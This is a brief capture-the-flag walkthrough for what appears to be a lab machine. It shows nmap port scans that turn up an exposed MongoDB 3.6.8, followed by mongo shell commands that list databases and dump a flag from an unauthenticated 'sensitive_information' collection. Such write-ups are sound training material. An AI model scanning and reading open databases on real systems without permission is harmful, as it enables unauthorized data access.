---- 
## Initial Information

- Attacker IP = 10.129.241.49
- Victim IP = 10.129.72.29
---
## Initial scan

- Did the initial scan, this only showed 1 port open for ssh
```shell
nmap -sV 10.129.72.29              
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

```

- Then did a full scan for all the ports that were not in the initial 1000 popular ports. found that there is mongodb running on port 27017. Found that the OS is ubuntu
```shell
nmap -p- -sV 10.129.72.29

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
- Mongo is a NoSQL database . showed the databases using the following 
```shell

> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> 

```
- following commands to get the flag

```shell 
> use sensitive_information
switched to db sensitive_information
> show collections
flag
> db.flag.find().pretty();
{
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
> 


```

---- 
## Resources

Mongodb https://www.mongodb.com/docs/manual/release-notes/3.6/